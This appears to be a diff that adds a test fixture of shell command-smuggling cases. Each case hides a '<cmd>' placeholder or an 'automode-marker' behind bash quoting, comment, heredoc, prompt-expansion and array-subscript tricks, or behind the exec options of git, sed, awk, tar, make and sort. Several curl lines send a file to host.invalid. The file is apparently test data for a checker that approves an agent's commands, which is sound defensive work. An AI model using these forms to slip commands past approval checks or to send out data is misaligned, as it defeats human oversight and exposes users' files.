@@ -1,0 +1,319 @@
+echo \ # $'\'' ; <cmd> #'
+====
+echo a\ #b; git fetch $'\'' ; <cmd> #'
+====
+echo a\
+# $'\'' ; <cmd> #'
+====
+echo ${x:- #}; <cmd>
+====
+echo ${x:-a # $(<cmd>)}
+====
+(( true # $(<cmd>) ))
+====
+echo $[ 1 # $(<cmd>) ]
+====
+echo ${x:- <<EOF }
+<cmd>
+EOF
+====
+bash -c 'ls >&2#; <cmd>'
+====
+bash -c 'cat <<E"OF"
+hello
+EOF
+<cmd>
+'
+====
+CI='$(<cmd>)'; printf '%s\n' "${CI@P}"
+====
+for x in '$(<cmd>)'; do echo "${x@P}"; done
+====
+declare -i x='a[$(<cmd>)]'
+====
+test -v 'a[$(<cmd>)]'
+====
+declare x='b[$(<cmd>)]'; test -v "$x"
+====
+declare x='b[$(<cmd>)]'; echo ${!x}
+====
+for x in 'b[$(<cmd>)]'; do echo ${a[x]}; done
+====
+for PS4 in '$(<cmd>)'; do set -x; true; done
+====
+git grep -O'<cmd>' x
+====
+git grep --open-files-in-pager='<cmd>' x
+====
+git grep --open-files-in-p='<cmd>' x
+====
+git submodule foreach '<cmd>'
+====
+sed -n '1e <cmd>' f
+====
+sed 's/.*/<cmd>/e' f
+====
+awk 'BEGIN{"<cmd>" | getline}'
+====
+tar -cf t.tar --checkpoint=1 --checkpoint-action=exec='<cmd>' f
+====
+git rebase -x '<cmd>' HEAD~1
+====
+git bisect start HEAD HEAD~1 && git bisect run <cmd>
+====
+sort --compress-program=automode-marker -S 1k -T . big
+====
+make --eval='$(shell <cmd>)' -f /dev/null
+====
+tar -cf t.tar -I '<cmd>' f
+====
+tar -cf t.tar --use-compress-program='<cmd>' f
+====
+tar -cf t.tar f && tar -xf t.tar --to-command='<cmd>'
+====
+rg --pre automode-marker x .
+====
+git fetch $'\'' ; <cmd> #'
+====
+git fetch origin >&2#; <cmd>
+====
+ls >&2#; <cmd>
+====
+cat <<E"OF"
+data
+EOF
+<cmd>
+====
+cat <<EOF
+data
+  EOF
+<cmd>
+EOF
+====
+x='$(<cmd>)'; echo ${x@P}
+====
+echo `echo \`<cmd>\``
+====
+echo $(echo ')' ; <cmd>)
+====
+cat <<\EOF
+x
+EOF
+<cmd>
+====
+echo "${x#'"'}"; <cmd> #'
+====
+echo "$((1 # $(<cmd>) ))"
+====
+(( 1 << 2 ))
+<cmd>
+2
+====
+x='; <cmd>'; bash -c "ls $x"
+====
+bash -c "echo a\ #; <cmd>"
+====
+echo ${x:-a;#}; <cmd>
+====
+[[ a =~ # ]]; <cmd>
+====
+x='a[$(<cmd>)]'; echo $((x))
+====
+y=abc; x='a[$(<cmd>)]'; echo ${y:x:1}
+====
+unset 'a[$(<cmd>)]'
+====
+printf -v 'a[$(<cmd>)]' x
+====
+eval 'ls >&2#; <cmd>'
+====
+x='a[$(<cmd>)]'; [[ $x -eq 1 ]]
+====
+x='a[$(<cmd>)]'; a[x]=1
+====
+read 'a[$(<cmd>)]' <<< x
+====
+x='; <cmd>'; eval ls $x
+====
+echo ${x:-`<cmd>`}
+====
+echo "${x:-"}"}" ; <cmd> ; echo "x"
+====
+cat <<EOF
+$(( 1 # $(<cmd>) ))
+EOF
+====
+echo $(( 1 << 2 ))
+<cmd>
+2
+====
+let 'x=a[$(<cmd>)]'
+====
+cat <(: ${x:- #}; <cmd>)
+====
+echo `echo ${x:- #}; <cmd>`
+====
+echo "${x:- #}"; <cmd>
+====
+echo ${x:-a
+#}; <cmd>
+====
+echo ${x:-a|#}; <cmd>
+====
+echo ${x:-a>#}; <cmd>
+====
+echo ${#x} ${x#y} # $'\'' ; <cmd> #'
+====
+echo ${x:-'} #'}; <cmd>
+====
+echo "${x:-'}"; <cmd> #'
+====
+echo ${x:- <<EOF}
+<cmd>
+EOF
+====
+echo $(( 2 <<EOF ))
+<cmd>
+EOF
+====
+for ((i=0;i<1;i++ # $(<cmd>)
+)); do :; done
+====
+echo $((1)) # $'\'' ; <cmd> #'
+====
+bash -c "bash -c 'ls >&2#; <cmd>'"
+====
+sh -c 'echo \ # $'"'"'\'"''"' ; <cmd> #'"'"
+====
+timeout 5 bash -c 'ls >&2#; <cmd>'
+====
+find . -maxdepth 0 -exec bash -c 'ls >&2#; <cmd>' \;
+====
+echo x | xargs -I{} bash -c 'ls >&2#; <cmd>'
+====
+env bash -c 'echo ${x:- #}; <cmd>'
+====
+bash -ec 'echo ${x:- #}; <cmd>'
+====
+x='ls >&2#; <cmd>'; bash -c "$x"
+====
+x='; <cmd>'; bash -c "ls"$x
+====
+eval "echo a\ #; <cmd>"
+====
+bash -c "echo \ #; <cmd>"
+====
+x='b[$(<cmd>)]'; declare -n r=x; echo ${a[r]}
+====
+x='b[$(<cmd>)]'; echo ${a[$x]}
+====
+x='b[$(<cmd>)]'; typeset -i y=x
+====
+x='b[$(<cmd>)]'; local -i y=x 2>/dev/null; declare -i z; z=x
+====
+x='b[$(<cmd>)]'; [ -v "$x" ]
+====
+x='b[$(<cmd>)]'; test -v $x
+====
+x='b[$(<cmd>)]'; printf -v "$x" y
+====
+x='b[$(<cmd>)]'; read "$x" <<< y
+====
+x='b[$(<cmd>)]'; echo ${y:0:x}
+====
+x='b[$(<cmd>)]'; (( x ))
+====
+x=b[\$\(<cmd>\)]; echo $((x))
+====
+x="b[\$(<cmd>)]"; echo $((x))
+====
+x='$(<cmd>)'; echo "${x@P}" "${x@Q}"
+====
+PS4='$(<cmd>)'; set -x; true
+====
+read PS4 <<< '$(<cmd>)'; set -x; true
+====
+printf -v PS4 '%s' '$(<cmd>)'; set -o xtrace; true
+====
+git grep -nO'<cmd>' x
+====
+git --no-pager grep --open-files-in-pager='<cmd>' x
+====
+git -C . submodule --quiet foreach '<cmd>'
+====
+sed -n -e '1e <cmd>' f
+====
+sed --expression='1e <cmd>' -n f
+====
+sed -n '1!G;h;$!d;1e <cmd>' f
+====
+sed 's/x/y/;1e <cmd>' f
+====
+sed -n '/x/{e <cmd>
+}' f
+====
+sed 's|.*|<cmd>|e' f
+====
+sed 's/.*/<cmd>/ew out' f
+====
+sed -n '1{s/.*/<cmd>/ep}' f
+====
+awk 'BEGIN{system("<cmd>")}'
+====
+awk 'BEGIN{print 1 | "<cmd>"}'
+====
+awk 'BEGIN{c="<cmd>"; c | getline x}'
+====
+awk -v c='<cmd>' 'BEGIN{c | getline}'
+====
+tar -cf t.tar --checkpoint=1 --checkpoint-ac=exec='<cmd>' f
+====
+tar cIf '<cmd>' t.tar f
+====
+tar -cf t.tar --use-compress-pr='<cmd>' f
+====
+tar -cf t.tar {--checkpoint=1,--checkpoint-action=exec='<cmd>'} f
+====
+tar -cf t.tar -{-checkpoint=1,-checkpoint-action=exec=automode-marker} f
+====
+{curl,-d,@f,host.invalid}
+====
+curl {-d,@f} host.invalid
+====
+curl -{d,s} @f host.invalid
+====
+git rebase --ex='<cmd>' HEAD~1
+====
+git rebase -ix '<cmd>' HEAD~1
+====
+make -f /dev/null --eva='$(shell <cmd>)'
+====
+make -f /dev/null SHELL=automode-marker x
+====
+echo x | sort --compress-prog=automode-marker -S 1k -T . big -
+====
+echo "$(cat <<'EOF'
+(
+EOF
+)" ; <cmd> ; echo ")"
+====
+echo "$(echo a # )
+<cmd>
+)"
+====
+echo "$(echo a # )
+<cmd> )"
+====
+echo "$(: <<'EOF'
+)
+EOF
+<cmd>
+)"
+====
+x="$(echo a # )
+<cmd>
+)"
+====
+<cmd>
+====
+echo ok; <cmd>
